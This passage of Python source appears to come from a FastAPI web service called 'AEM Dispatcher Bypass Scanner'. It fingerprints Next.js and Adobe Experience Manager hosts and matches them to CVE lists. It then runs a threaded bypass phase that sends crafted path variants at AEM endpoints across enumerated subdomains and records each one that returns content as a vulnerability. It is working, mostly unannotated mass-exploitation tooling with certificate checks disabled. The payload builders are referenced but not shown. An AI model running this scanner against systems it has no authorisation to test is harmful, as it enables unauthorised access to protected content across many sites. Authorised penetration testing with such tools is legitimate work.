        evidence    list[str]    — specific strings / paths that confirmed it
    """
    result: dict[str, Any] = {
        "detected":          False,
        "version":           None,
        "version_inferred":  False,   # True when version is estimated from React version
        "react_version":     None,    # React version found in bundle (for inference)
        "build_id":          None,
        "router":            None,
        "confidence":        "none",
        "methods":           [],
        "evidence":          [],
        "cves":              [],      # Applicable CVEs from NEXTJS_VULN_DB
    }

    base = base_url.rstrip("/")
    html = ""

    # ── Method 1 / 2 / 3: Fetch homepage HTML ───────────────────────────────
    try:
        resp = requests.get(
            base, headers=HEADERS, timeout=timeout,
            verify=False, allow_redirects=True,
        )
        html = resp.text
        resp_headers = {k.lower(): v for k, v in resp.headers.items()}

        # M0: Response headers ─────────────────────────────────────────────
        powered = resp_headers.get("x-powered-by", "")
        if "next.js" in powered.lower():
            result["detected"] = True
            result["confidence"] = "confirmed"
            result["methods"].append("X-Powered-By: Next.js header")
            result["evidence"].append(f"X-Powered-By: {powered}")
            m = re.search(r"Next\.js[/\s]+([\d.]+)", powered, re.I)
            if m and not result["version"]:
                result["version"] = m.group(1)

        for hdr in ("x-nextjs-cache", "x-next-cache", "x-nextjs-prerender"):
            if hdr in resp_headers:
                result["detected"] = True
                result["confidence"] = "confirmed"
                result["methods"].append(f"{hdr} response header")
                result["evidence"].append(f"{hdr}: {resp_headers[hdr]}")

        # M1: __NEXT_DATA__ (Pages Router) ─────────────────────────────────
        nd_match = re.search(
            r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>\s*(\{.*?\})\s*</script>',
            html, re.DOTALL,
        )
        if nd_match:
            result["detected"] = True
            result["confidence"] = "confirmed"
            result["router"] = "pages"
            result["methods"].append("__NEXT_DATA__ script tag (Pages Router)")
            try:
                nd = json.loads(nd_match.group(1))
                bid = nd.get("buildId")
                if bid:
                    result["build_id"] = bid
                    result["evidence"].append(f"buildId: {bid}")
                if nd.get("page"):
                    result["evidence"].append(f"page: {nd['page']}")
                if nd.get("nextExport"):
                    result["evidence"].append("static export detected")
                # version sometimes embedded
                ver = nd.get("runtimeConfig", {}).get("nextVersion") or nd.get("version")
                if ver and not result["version"]:
                    result["version"] = str(ver)
            except (json.JSONDecodeError, AttributeError):
                pass

        # M2: <meta name="generator" content="Next.js X.Y.Z"> ────────────
        gen = re.search(
            r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']Next\.js\s*([\d][^"\']*)["\']',
            html, re.I,
        ) or re.search(
            r'<meta[^>]+content=["\']Next\.js\s*([\d][^"\']*)["\'][^>]+name=["\']generator["\']',
            html, re.I,
        )
        if gen:
            result["detected"] = True
            result["confidence"] = "confirmed"
            ver = gen.group(1).strip()
            if ver and not result["version"]:
                result["version"] = ver
            result["methods"].append("meta[name=generator] tag")
            result["evidence"].append(f'<meta name="generator" content="Next.js {ver}">')

        # M2b: next-head-count meta (App Router) ──────────────────────────
        nhc = re.search(r'<meta[^>]+name=["\']next-head-count["\']', html, re.I)
        if nhc:
            result["detected"] = True
            result["confidence"] = "confirmed"
            if not result["router"]:
                result["router"] = "app"
            elif result["router"] == "pages":
                result["router"] = "hybrid"
            result["methods"].append("meta[name=next-head-count] (App Router)")
            result["evidence"].append('meta[name="next-head-count"] present')

        # M3: <div id="__next"> and data-next-page ────────────────────────
        if re.search(r'<div[^>]+id=["\']__next["\']', html, re.I):
            result["detected"] = True
            if result["confidence"] == "none":
                result["confidence"] = "suspected"
            if not result["router"]:
                result["router"] = "pages"
            result["methods"].append('<div id="__next"> in DOM')
            result["evidence"].append('DOM: <div id="__next">')

        if "data-next-page" in html:
            result["detected"] = True
            result["confidence"] = "confirmed"
            result["methods"].append("data-next-page attribute")
            result["evidence"].append("data-next-page attribute in HTML")

        # M4a: /_next/ asset references in HTML ───────────────────────────
        next_srcs = re.findall(r'["\'](\/_next\/static\/[^"\'?]+)["\']', html)
        if next_srcs:
            result["detected"] = True
            if result["confidence"] == "none":
                result["confidence"] = "suspected"
            result["methods"].append("/_next/static/ asset paths in HTML source")
            result["evidence"].append(f"Example asset: {next_srcs[0]}")
            # Try to parse buildId from chunk path: /_next/static/<buildId>/...
            for src in next_srcs:
                bid_m = re.search(r"/_next/static/([a-zA-Z0-9_\-]{10,})/", src)
                if bid_m and not result["build_id"]:
                    candidate = bid_m.group(1)
                    if candidate not in ("chunks", "css", "media", "images"):
                        result["build_id"] = candidate
                        result["evidence"].append(f"buildId from asset path: {candidate}")

        # Version in HTML comments / inline scripts ────────────────────────
        inline_ver = _extract_nextjs_version_from_js(html[:20_000])
        if inline_ver and not result["version"]:
            result["version"] = inline_ver
            result["evidence"].append(f"Version in HTML inline script: {inline_ver}")

    except requests.RequestException:
        pass

    # ── Method 4: /_next/static/ asset probe ────────────────────────────────
    static_probes = [
        "/_next/static/chunks/polyfills.js",
        "/_next/static/chunks/main.js",
        "/_next/static/chunks/main-app.js",
        "/_next/static/chunks/webpack.js",
        "/_next/static/chunks/framework.js",
    ]
    for path in static_probes:
        try:
            r = requests.get(
                base + path, headers=HEADERS, timeout=timeout,
                verify=False, allow_redirects=False,
            )
            ct = r.headers.get("content-type", "").lower()
            is_js = "javascript" in ct or "text/plain" in ct
            # Also accept if response starts with actual JS (not HTML)
            body_start = r.text[:50].strip()
            looks_like_js = not body_start.startswith(("<", "<!"))
            if r.status_code == 200 and len(r.content) > 200 and (is_js or looks_like_js):
                result["detected"] = True
                result["confidence"] = "confirmed"
                result["methods"].append(f"/_next/static/ asset confirmed ({path.split('/')[-1]})")
                result["evidence"].append(f"HTTP 200 — {path}")
                if not result["version"]:
                    ver = _extract_nextjs_version_from_js(r.text[:80_000])
                    if ver:
                        result["version"] = ver
                        result["evidence"].append(f"Version from {path}: {ver}")
                break   # one confirmed path is enough
        except requests.RequestException:
            pass

    # ── Method 5: /_next/image endpoint signature ────────────────────────────
    if not result["detected"]:
        try:
            r = requests.get(
                base + "/_next/image?url=%2F&w=32&q=75",
                headers=HEADERS, timeout=timeout,
                verify=False, allow_redirects=False,
            )
            body = r.text[:500]
            # Next.js returns a structured JSON error for bad params
            if r.status_code in (400, 500) and (
                '"message"' in body or "url" in body.lower()
            ):
                result["detected"] = True
                result["confidence"] = "confirmed"
                result["methods"].append("/_next/image optimization endpoint")
                result["evidence"].append(f"/_next/image responded HTTP {r.status_code}")
        except requests.RequestException:
            pass

    # ── Method 6: buildManifest.js via known buildId ─────────────────────────
    if result["detected"] and result["build_id"] and not result["version"]:
        manifest_url = f"{base}/_next/static/{result['build_id']}/_buildManifest.js"
        try:
            r = requests.get(
                manifest_url, headers=HEADERS, timeout=timeout,
                verify=False, allow_redirects=False,
            )
            if r.status_code == 200:
                ver = _extract_nextjs_version_from_js(r.text[:50_000])
                if ver:
                    result["version"] = ver
                    result["evidence"].append(f"Version from _buildManifest.js: {ver}")
                result["methods"].append("_buildManifest.js confirmed")
        except requests.RequestException:
            pass

    # ── Method 7: Probe ALL hashed /_next/static/chunks/*.js from HTML ─────────
    # Parse every <script src="/_next/static/chunks/..."> from HTML, sort by
    # priority (framework first, then webpack/main/polyfills, numbered chunks last),
    # fetch up to 10 and attempt version extraction.  Also capture React version from
    # the framework chunk so we can infer the Next.js range later.
    if result["detected"] and html:
        all_chunk_srcs = re.findall(
            r'["\'](\/_next\/static\/chunks\/[^"\'?>\s]+\.js)["\']', html
        )

        def _chunk_sort_key(src: str) -> int:
            name = src.rsplit("/", 1)[-1].lower()
            if "framework" in name:    return 0
            if "webpack"   in name:    return 1
            if "main-app"  in name:    return 2
            if name.startswith("main"): return 3
            if "polyfill"  in name:    return 4
            if "_app"      in name:    return 5
            if "pages"     in name:    return 6
            return 10  # numbered/vendor chunks

        react_ver_found: str | None = None
        probed = 0
        for chunk_src in sorted(set(all_chunk_srcs), key=_chunk_sort_key):
            if probed >= 10:
                break
            probed += 1
            try:
                r = requests.get(
                    base + chunk_src, headers=HEADERS, timeout=timeout,
                    verify=False, allow_redirects=False,
                )
                if r.status_code != 200 or len(r.content) < 100:
                    continue
                # Skip catch-all HTML responses masquerading as JS files
                ct = r.headers.get("content-type", "").lower()
                body_preview = r.text[:80].strip()
                if body_preview.startswith(("<", "<!")) and "javascript" not in ct:
                    continue
                js_text = r.text[:120_000]
                chunk_name = chunk_src.rsplit("/", 1)[-1]

                if not result["version"]:
                    ver = _extract_nextjs_version_from_js(js_text)
                    if ver:
                        result["version"] = ver
                        result["evidence"].append(f"Version from chunk {chunk_name}: {ver}")
                        result["methods"].append(f"JS chunk version ({chunk_name})")

                # Detect App Router from main-app chunk
                if "main-app" in chunk_src.lower() and "appRouter" in js_text[:8000]:
                    if not result["router"]:
                        result["router"] = "app"
                    elif result["router"] == "pages":
                        result["router"] = "hybrid"
                    if "main-app.js chunk (App Router confirmed)" not in result["methods"]:
                        result["methods"].append("main-app.js chunk (App Router confirmed)")

                # Extract React version from framework chunk for inference
                if not react_ver_found and "framework" in chunk_src.lower():
                    react_ver_found = _extract_react_version_from_js(js_text)
                    if react_ver_found:
                        result["react_version"] = react_ver_found
                        result["evidence"].append(f"React {react_ver_found} in framework chunk")

            except requests.RequestException:
                pass

    # Probe unhashed main-app chunk (App Router, unversioned path)
    if result["detected"]:
        try:
            r = requests.get(
                base + "/_next/static/chunks/main-app.js",
                headers=HEADERS, timeout=timeout,
                verify=False, allow_redirects=False,
            )
            if r.status_code == 200 and "appRouter" in r.text[:5000]:
                if not result["router"]:
                    result["router"] = "app"
                elif result["router"] == "pages":
                    result["router"] = "hybrid"
                if "main-app.js chunk (App Router confirmed)" not in result["methods"]:
                    result["methods"].append("main-app.js chunk (App Router confirmed)")
                if not result["version"]:
                    ver = _extract_nextjs_version_from_js(r.text[:120_000])
                    if ver:
                        result["version"] = ver
                        result["evidence"].append(f"Version from main-app.js: {ver}")
        except requests.RequestException:
            pass

    # ── Method 8: React version → Next.js range inference (fallback) ──────────
    # When no exact version could be found, infer the Next.js major range from the
    # React version in the framework bundle.  This handles hardened production builds
    # (e.g. Microsoft, Vercel enterprise) that strip version strings entirely.
    if result["detected"] and not result["version"]:
        # Try to get React version if we haven't already (from framework chunk)
        if not result["react_version"] and html:
            fw_src = re.search(
                r'["\'](\/_next\/static\/chunks\/framework[-.\w]+\.js)["\']', html
            )
            if fw_src:
                try:
                    r = requests.get(
                        base + fw_src.group(1), headers=HEADERS, timeout=timeout,
                        verify=False, allow_redirects=False,
                    )
                    if r.status_code == 200:
                        rv = _extract_react_version_from_js(r.text[:120_000])
                        if rv:
                            result["react_version"] = rv
                            result["evidence"].append(f"React {rv} in framework chunk")
                except requests.RequestException:
                    pass

        if result["react_version"]:
            try:
                react_major = int(result["react_version"].split(".")[0])
                nextjs_range = _REACT_TO_NEXTJS_RANGE.get(react_major)
                if nextjs_range:
                    result["version"] = nextjs_range
                    result["version_inferred"] = True
                    result["methods"].append(
                        f"Version inferred from React {result['react_version']}"
                    )
                    result["evidence"].append(
                        f"React {result['react_version']} → Next.js {nextjs_range} "
                        f"(version strings stripped in production build)"
                    )
            except (ValueError, AttributeError):
                pass

    # ── Populate CVE list now that version is finalised ────────────────────────
    if result["detected"]:
        result["cves"] = check_nextjs_vulns(
            result["version"],
            result["version_inferred"],
        )

    return result


def phase3_aem_detect(scan: ScanState) -> None:
    """Parallel AEM fingerprinting across all alive hosts."""
    hosts = scan.alive_hosts
    if not hosts:
        _send_ws(scan, {
            "type": "phase",
            "phase": 3,
            "name": "AEM Detection",
            "status": "skipped",
            "message": "No alive hosts to fingerprint",
        })
        return

    _send_ws(scan, {
        "type": "phase",
        "phase": 3,
        "name": "AEM Detection",
        "status": "running",
    })
    scan.phase = ScanPhase.AEM_DETECT

    # ── Resume support: skip hosts already probed in a prior run ──
    already_probed = set(scan.aem_hosts.keys())
    if already_probed:
        hosts = [h for h in hosts if h.rstrip("/") not in already_probed]
        log.info(
            "Phase 3: resuming — skipping %d already-probed hosts, %d remaining",
            len(already_probed), len(hosts),
        )
        _send_ws(scan, {
            "type": "log", "level": "info",
            "message": (
                f"↩ Resuming Phase 3: {len(already_probed):,} hosts already probed, "
                f"{len(hosts):,} remaining"
            ),
        })
        if not hosts:
            _send_ws(scan, {
                "type": "phase", "phase": 3, "name": "AEM Detection",
                "status": "complete", "count": len(scan.aem_hosts),
                "message": "All hosts already probed (resumed)",
            })
            return

    log.info("Phase 3: AEM detection on %d hosts", len(hosts))

    done = [0]
    lock = threading.Lock()
    total = len(hosts)

    def _probe(base: str) -> None:
        if scan.cancelled:
            return
        # Pause here if internet is down; resume when back
        with lock:
            current_done = done[0]
        if not _wait_for_internet(scan, f"Phase 3 AEM detect {current_done}/{total}"):
            return
        base = base.rstrip("/")

        # ── AEM fingerprinting ────────────────────────────────────────────
        confidence, score, reasons = detect_aem_host(base, scan, scan.timeout)

        # ── Next.js fingerprinting (runs on same host, reuses HTTP ────────
        nextjs = detect_nextjs_host(base, scan.timeout)

        with lock:
            done[0] += 1
            scan.aem_hosts[base] = {
                "confidence": confidence,
                "score": score,
                "reasons": reasons,
            }
            scan.phase3_cursor = len(already_probed) + done[0]
            if nextjs["detected"]:
                scan.nextjs_hosts[base] = nextjs

        if confidence in ("confirmed", "suspected"):
            _send_ws(scan, {
                "type": "aem_detected",
                "phase": 3,
                "host": base,
                "confidence": confidence,
                "score": score,
                "reasons": reasons,
            })

        if nextjs["detected"]:
            _send_ws(scan, {
                "type":       "nextjs_detected",
                "phase":      3,
                "host":       base,
                "version":    nextjs["version"],
                "build_id":   nextjs["build_id"],
                "router":     nextjs["router"],
                "confidence": nextjs["confidence"],
                "methods":    nextjs["methods"],
                "evidence":   nextjs["evidence"],
            })

        _send_ws(scan, {
            "type": "progress",
            "phase": 3,
            "current": done[0],
            "total": total,
            "message": f"Probed {done[0]}/{total} hosts",
        })

    max_w = min(scan.threads, total, 60)
    with ThreadPoolExecutor(max_workers=max_w) as pool:
        futs = [pool.submit(_probe, h) for h in hosts]
        for f in as_completed(futs):
            pass

    confirmed = sum(
        1 for v in scan.aem_hosts.values() if v["confidence"] == "confirmed"
    )
    suspected = sum(
        1 for v in scan.aem_hosts.values() if v["confidence"] == "suspected"
    )
    skipped = sum(
        1 for v in scan.aem_hosts.values() if v["confidence"] == "not_aem"
    )

    _send_ws(scan, {
        "type": "phase",
        "phase": 3,
        "name": "AEM Detection",
        "status": "complete",
        "confirmed": confirmed,
        "suspected": suspected,
        "skipped": skipped,
    })
    log.info(
        "Phase 3 complete: %d confirmed, %d suspected, %d skipped",
        confirmed,
        suspected,
        skipped,
    )


# ============================================================================
# PHASE 4: BYPASS SCAN
# ============================================================================
def _do_bypass_request(
    base_url: str,
    url_path: str,
    tag: str,
    ep_label: str,
    soft404_sizes: list[int],
    host_sem: threading.Semaphore,
    scan: ScanState,
) -> dict[str, Any] | None:
    """Execute a single bypass probe. Returns hit dict or None."""
    full_url = base_url + url_path

    with host_sem:
        for attempt in range(2):
            if scan.cancelled:
                return None
            try:
                resp = requests.get(
                    full_url,
                    headers=HEADERS,
                    timeout=scan.timeout,
                    verify=False,
                    allow_redirects=False,
                )

                if resp.status_code == 429:
                    if attempt == 0:
                        time.sleep(2 + attempt)
                        continue
                    return None

                if resp.status_code != 200:
                    return None

                if not is_real_aem_response(resp, ep_label, soft404_sizes):
                    return None

                size = len(resp.content)
                ctype = resp.headers.get("Content-Type", "")
                return {
                    "host": base_url,
                    "endpoint": ep_label,
                    "endpoint_path": url_path,
                    "bypass": tag,
                    "full_url": full_url,
                    "status_code": 200,
                    "size": size,
                    "content_type": ctype,
                    "genuine": True,
                }

            except (
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ReadTimeout,
                requests.exceptions.ConnectionError,
            ):
                if attempt == 0:
                    time.sleep(0.5)
                continue
            except Exception:
                return None

    return None


def phase4_bypass(scan: ScanState) -> None:
    """Run all bypass techniques against confirmed/suspected AEM hosts."""
    aem_targets = [
        base
        for base, info in scan.aem_hosts.items()
        if info["confidence"] in ("confirmed", "suspected")
    ]

    if not aem_targets:
        _send_ws(scan, {
            "type": "phase",
            "phase": 4,
            "name": "Bypass Scan",
            "status": "skipped",
            "message": "No AEM hosts to bypass-scan",
        })
        return

    _send_ws(scan, {
        "type": "phase",
        "phase": 4,
        "name": "Bypass Scan",
        "status": "running",
    })
    scan.phase = ScanPhase.BYPASS

    log.info("Phase 4: Bypass scan on %d AEM hosts", len(aem_targets))

    # --- Parallel soft-404 baseline probes ---
    host_soft404: dict[str, list[int]] = {}
    with ThreadPoolExecutor(
        max_workers=min(scan.threads, len(aem_targets), 50)
    ) as pp:
        pfuts = {
            pp.submit(get_soft404_baseline, b, scan.timeout): b for b in aem_targets
        }
        for f in as_completed(pfuts):
            base = pfuts[f]
            sizes = f.result()
            host_soft404[base] = sizes
            if sizes:
                _send_ws(scan, {
                    "type": "progress",
                    "phase": 4,
                    "current": 0,
                    "total": 0,
                    "message": f"Soft-404 detected on {base} (baseline {sizes}B) — body-signature filter active",
                })

    # --- Build work items ---
    host_sems = {
        b: threading.Semaphore(scan.per_host) for b in aem_targets
    }
    # work items: (base_host, url_path, bypass_tag, endpoint_label, endpoint_raw_path)
    work: list[tuple[str, str, str, str, str]] = []
    host_count: dict[str, int] = defaultdict(int)

    for base in aem_targets:
        for ep_path, ep_label in AEM_ENDPOINTS:
            bypasses = build_bypass_paths(ep_path)
            for tag, url_path in bypasses:
                work.append((base, url_path, tag, ep_label, ep_path))
                host_count[base] += 1

            # ext-json selector bypass
            ext = build_ext_json_path(ep_path)
            if ext:
                tag, url_path = ext
                work.append((base, url_path, tag, ep_label, ep_path))
                host_count[base] += 1

    total_reqs = len(work)
    done = [0]
    lock = threading.Lock()

    _send_ws(scan, {
        "type": "progress",
        "phase": 4,
        "current": 0,
        "total": total_reqs,
        "message": f"Starting {total_reqs} bypass probes across {len(aem_targets)} AEM hosts",
    })

    host_remaining = dict(host_count)
    host_hits: dict[str, list] = defaultdict(list)
    rem_lock = threading.Lock()

    # Deduplication: track (full_url) already reported.
    # Pre-seed with existing findings so a resume doesn't re-report them.
    seen_vuln_urls: set[str] = {
        v.get("full_url", "") for v in scan.vulnerabilities if v.get("full_url")
    }
    if seen_vuln_urls:
        log.info("Phase 4: resuming — %d vulnerabilities already recorded, dedup set pre-seeded",
                 len(seen_vuln_urls))
        _send_ws(scan, {
            "type": "log", "level": "info",
            "message": f"↩ Resuming Phase 4: {len(seen_vuln_urls):,} vulnerabilities already found",
        })
    seen_lock = threading.Lock()

    # Direct-path baseline cache: tracks which endpoints are openly accessible
    # (not blocked by dispatcher) so we don't report them as bypass findings
    direct_open: dict[str, bool] = {}
    direct_lock = threading.Lock()

    def _is_directly_open(base: str, ep_path: str) -> bool:
        """Return True if the endpoint is accessible directly (no bypass needed)."""
        key = base + "/" + ep_path.split("?")[0]
        with direct_lock:
            if key in direct_open:
                return direct_open[key]
        direct_url = base + "/" + ep_path
        try:
            r = requests.get(direct_url, headers=HEADERS, timeout=scan.timeout,
                             verify=False, allow_redirects=False)
            is_open = r.status_code == 200
        except Exception:
            is_open = False
        with direct_lock:
            direct_open[key] = is_open
        return is_open

    def _worker(base: str, url_path: str, tag: str, ep_label: str, ep_path: str) -> None:
        if scan.cancelled:
            return
        # Pause here if internet is down
        with lock:
            current_done = done[0]
        if not _wait_for_internet(scan, f"Phase 4 bypass {current_done}/{total_reqs}"):
            return
        result = _do_bypass_request(
            base,
            url_path,
            tag,
            ep_label,
            host_soft404.get(base, []),
            host_sems[base],
            scan,
        )

        with lock:
            done[0] += 1
            progress_count = done[0]

        if result:
            full_url = result["full_url"]
            # Skip if this exact URL was already reported (duplicate)
            with seen_lock:
                if full_url in seen_vuln_urls:
                    return
                seen_vuln_urls.add(full_url)
            # Skip if the endpoint is directly accessible (not a real bypass)
            if _is_directly_open(base, ep_path):
                return
            scan.vulnerabilities.append(result)
            host_hits[base].append(result)
            _send_ws(scan, {
                "type": "vulnerability",
                "phase": 4,
                "host": result["host"],
                "endpoint": result["endpoint"],
                "bypass": result["bypass"],
                "full_url": result["full_url"],
                "status_code": result["status_code"],
                "size": result["size"],
                "content_type": result["content_type"],
                "genuine": result["genuine"],
            })

        if progress_count % 100 == 0 or progress_count == total_reqs:
            _send_ws(scan, {
                "type": "progress",
                "phase": 4,
                "current": progress_count,
                "total": total_reqs,
                "message": f"Probed {progress_count}/{total_reqs} ({progress_count * 100 // total_reqs}%)",
            })

        with rem_lock:
            host_remaining[base] -= 1

    # --- Flat pool execution ---
    with ThreadPoolExecutor(max_workers=scan.threads) as pool:
        futs = [
            pool.submit(_worker, base, url_path, tag, ep_label, ep_path)
            for base, url_path, tag, ep_label, ep_path in work
        ]
        for f in as_completed(futs):
            pass

    # --- Build summary ---
    vuln_hosts = [h for h in aem_targets if host_hits.get(h)]
    by_bypass: dict[str, int] = defaultdict(int)
    by_endpoint: dict[str, int] = defaultdict(int)
    for v in scan.vulnerabilities:
        by_bypass[v["bypass"]] += 1
        by_endpoint[v["endpoint"]] += 1

    scan.vulnerability_summary = {
        "total_hosts_scanned": len(aem_targets),
        "vulnerable_hosts": len(vuln_hosts),
        "total_vulnerabilities": len(scan.vulnerabilities),
        "total_requests": total_reqs,
        "by_bypass": dict(by_bypass),
        "by_endpoint": dict(by_endpoint),
        "vulnerable_host_list": vuln_hosts,
    }

    _send_ws(scan, {
        "type": "phase",
        "phase": 4,
        "name": "Bypass Scan",
        "status": "complete",
        "vulnerable_hosts": len(vuln_hosts),
        "total_hits": len(scan.vulnerabilities),
    })
    log.info(
        "Phase 4 complete: %d vulnerable hosts, %d hits",
        len(vuln_hosts),
        len(scan.vulnerabilities),
    )


# ============================================================================
# SCAN ORCHESTRATOR
# ============================================================================
def run_scan(scan: ScanState) -> None:
    """Execute all 4 phases sequentially in a background thread."""
    scan.started_at = time.time()
    scan.status = "running"
    _persist_scan(scan)   # save "running" state immediately

    # Determine starting phase (for continue-from-phase support)
    start_phase = getattr(scan, '_start_phase', 1)

    try:
        # ── Phase 1: Subdomain Enumeration ──
        if start_phase <= 1:
            if scan.domain and not scan.urls:
                phase1_subdomains(scan)
                _persist_scan(scan)   # save after phase 1
                if scan.cancelled:
                    scan.status = "cancelled"
                    scan.finished_at = time.time()
                    _persist_scan(scan)
                    return
            elif scan.urls:
                # Direct URL mode: skip subfinder, populate alive hosts directly
                scan.alive_hosts = [u for u in (normalize_url(u) for u in scan.urls) if u]
                _send_ws(scan, {
                    "type": "phase",
                    "phase": 1,
                    "name": "Subdomain Enumeration",
                    "status": "skipped",
                    "message": f"Using {len(scan.alive_hosts)} provided URLs directly",
                })
        else:
            _send_ws(scan, {
                "type": "phase",
                "phase": 1,
                "name": "Subdomain Enumeration",
                "status": "skipped",
                "message": f"Skipped (starting from phase {start_phase})",
            })

        # ── Phase 2: Alive Check ──
        if start_phase <= 2:
            # Skip alive check ONLY when this is a clean upload start (no subdomains,
            # no cursor). If phase2_cursor > 0 the scan was interrupted mid-phase 2
            # and we must resume it.
            _upload_skip = (
                start_phase == 2
                and scan.alive_hosts
                and not scan.subdomains
                and scan.phase2_cursor == 0
                and not getattr(scan, '_is_resume', False)
            )
            if _upload_skip:
                # Pre-populated from upload — skip alive check, just notify
                _send_ws(scan, {
                    "type": "phase",
                    "phase": 2,
                    "name": "Alive Check",
                    "status": "skipped",
                    "message": f"Using {len(scan.alive_hosts)} uploaded alive hosts",
                })
                # Send host_found for each so the UI populates
                for host in scan.alive_hosts:
                    _send_ws(scan, {
                        "type": "host_found",
                        "host": host,
                        "status_code": 0,
                    })
            elif scan.subdomains:
                # Run alive check on whatever subdomains we have
                # (works whether they came from subfinder or an uploaded file)
                phase2_alive(scan)
                _persist_scan(scan)   # save after phase 2
                if scan.cancelled:
                    scan.status = "cancelled"
                    scan.finished_at = time.time()
                    _persist_scan(scan)
                    return
            elif not scan.alive_hosts:
                # Last resort: no subdomains, no alive list — treat urls as alive
                scan.alive_hosts = [
                    u
                    for u in (normalize_url(s) for s in scan.urls)
                    if u
                ]
        else:
            _send_ws(scan, {
                "type": "phase",
                "phase": 2,
                "name": "Alive Check",
                "status": "skipped",
                "message": f"Skipped (starting from phase {start_phase})",
            })

        if not scan.alive_hosts:
            scan.status = "complete"
            scan.phase = ScanPhase.COMPLETE
            scan.finished_at = time.time()
            _persist_scan(scan)
            _send_ws(scan, {
                "type": "scan_complete",
                "summary": {"error": "No alive hosts found"},
            })
            return

        # ── Phase 3: AEM Detection ──
        if start_phase <= 3:
            if start_phase == 3 and scan.alive_hosts:
                # Already have alive hosts from upload — send counts
                _send_ws(scan, {
                    "type": "progress",
                    "phase": 2,
                    "counts": {"alive": len(scan.alive_hosts)},
                })
            phase3_aem_detect(scan)
            _persist_scan(scan)   # save after phase 3
            if scan.cancelled:
                scan.status = "cancelled"
                scan.finished_at = time.time()
                _persist_scan(scan)
                return
        else:
            _send_ws(scan, {
                "type": "phase",
                "phase": 3,
                "name": "AEM Detection",
                "status": "skipped",
                "message": f"Skipped (starting from phase {start_phase})",
            })

        # ── Phase 4: Bypass Scan ──
        if start_phase <= 4:
            if start_phase == 4 and scan.aem_hosts:
                # Pre-populated AEM hosts from upload — notify each
                for host, info in scan.aem_hosts.items():
                    _send_ws(scan, {
                        "type": "aem_detected",
                        "host": host,
                        "confidence": info.get("confidence", "confirmed"),
                        "score": info.get("score", 0),
                        "reasons": info.get("reasons", []),
                    })
            phase4_bypass(scan)
            _persist_scan(scan)   # save after phase 4
            if scan.cancelled:
                scan.status = "cancelled"
                scan.finished_at = time.time()
                _persist_scan(scan)
                return

        scan.status = "complete"
        scan.phase = ScanPhase.COMPLETE
        scan.finished_at = time.time()
        _persist_scan(scan)   # final save

        elapsed = scan.finished_at - scan.started_at
        _send_ws(scan, {
            "type": "scan_complete",
            "summary": {
                "scan_id": scan.scan_id,
                "elapsed_seconds": round(elapsed, 1),
                "domain": scan.domain,
                "subdomains_found": len(scan.subdomains),
                "alive_hosts": len(scan.alive_hosts),
                "aem_confirmed": sum(
                    1
                    for v in scan.aem_hosts.values()
                    if v["confidence"] == "confirmed"
                ),
                "aem_suspected": sum(
                    1
                    for v in scan.aem_hosts.values()
                    if v["confidence"] == "suspected"
                ),
                "vulnerabilities": len(scan.vulnerabilities),
                "vulnerability_summary": scan.vulnerability_summary,
            },
        })
        log.info("Scan %s complete in %.1fs", scan.scan_id, elapsed)

    except Exception as e:
        scan.status = "error"
        scan.phase = ScanPhase.ERROR
        scan.finished_at = time.time()
        _persist_scan(scan)
        log.exception("Scan %s failed: %s", scan.scan_id, e)
        _send_ws(scan, {
            "type": "scan_complete",
            "summary": {"error": str(e)},
        })
    finally:
        # Signal the WS dispatcher to stop
        _send_ws(scan, None)


# ============================================================================
# RESUME LOGIC
# ============================================================================

def _determine_resume_phase(scan: ScanState) -> int:
    """
    Inspect saved state and return the phase number to resume from.

    Priority:
      4 — AEM hosts already detected, Phase 4 (bypass) incomplete / not started
      3 — Alive hosts found, Phase 3 incomplete / not started
      2 — Subdomains collected (or cursor > 0), Phase 2 incomplete / not started
      1 — Nothing useful saved; start from scratch
    """
    has_subs   = bool(scan.subdomains)
    has_alive  = bool(scan.alive_hosts)
    has_aem    = bool(scan.aem_hosts)
    has_vulns  = bool(scan.vulnerabilities)

    # If AEM hosts are known, run / re-run Phase 4 (bypass scan).
    # Phase 4 already deduplicates against existing scan.vulnerabilities.
    if has_aem:
        return 4

    # Alive hosts found but AEM detection not started / incomplete
    if has_alive:
        probed = len(scan.aem_hosts)          # 0 if not started
        alive  = len(scan.alive_hosts)
        # If partial phase 3: some probed, some not → resume phase 3
        # If no probing done at all  → start phase 3
        return 3

    # Subdomains collected or mid-phase-2 (cursor > 0) → resume phase 2
    if has_subs or scan.phase2_cursor > 0:
        return 2

    # Nothing — full restart
    return 1


def _run_scan_resumed(scan: ScanState) -> None:
    """
    Entry-point for a background thread that resumes an interrupted scan.
    Figures out the right phase, then drives run_scan() from there.
    """
    resume_phase = _determine_resume_phase(scan)
    scan._start_phase = resume_phase
    scan._is_resume   = True           # prevents upload-skip logic in run_scan
    scan.cancelled    = False
    scan.status       = "running"
    scan.paused_reason = ""
    if not scan.started_at:
        scan.started_at = time.time()  # shouldn't happen, but be safe
    _persist_scan(scan)

    log.info(
        "Resuming scan %s from Phase %d  "
        "(subs=%d  alive=%d  aem=%d  vulns=%d  p2cursor=%d)",
        scan.scan_id, resume_phase,
        len(scan.subdomains), len(scan.alive_hosts),
        len(scan.aem_hosts), len(scan.vulnerabilities),
        scan.phase2_cursor,
    )
    _send_ws(scan, {
        "type": "log", "level": "info",
        "message": (
            f"▶ Resuming scan from Phase {resume_phase}  "
            f"(subdomains: {len(scan.subdomains):,}  "
            f"alive: {len(scan.alive_hosts):,}  "
            f"AEM: {len(scan.aem_hosts):,}  "
            f"vulns: {len(scan.vulnerabilities):,})"
        ),
    })

    run_scan(scan)


# ============================================================================
# FASTAPI APP
# ============================================================================
app = FastAPI(
    title="AEM Dispatcher Bypass Scanner",
    version="2.0.0",
    description="Real-time AEM Dispatcher bypass detection with WebSocket updates",
)


@app.on_event("startup")
async def startup_event() -> None:
    """Load persisted scans from disk on server start."""
    _load_persisted_scans()
    log.info("Server started — %d scan(s) restored from disk", len(scans))


class ScanRequest(BaseModel):
    domain: str | None = None
    url: str | None = None
    urls: list[str] | None = None
    threads: int = DEFAULT_THREADS
    per_host_concurrency: int = DEFAULT_PER_HOST
    timeout: int = DEFAULT_TIMEOUT
    bypass_mode: str = "full"
    # Continue-from-phase support
    start_phase: int = 1          # 1=subdomains, 2=alive, 3=aem, 4=bypass
    uploaded_hosts: list[str] | None = None       # small inline host list
    uploaded_hosts_id: str | None = None          # server-side upload ID (for large files)


@app.post("/api/scan")
async def start_scan(req: ScanRequest) -> JSONResponse:
    """Start a new scan. Accepts domain, single url, or url list.
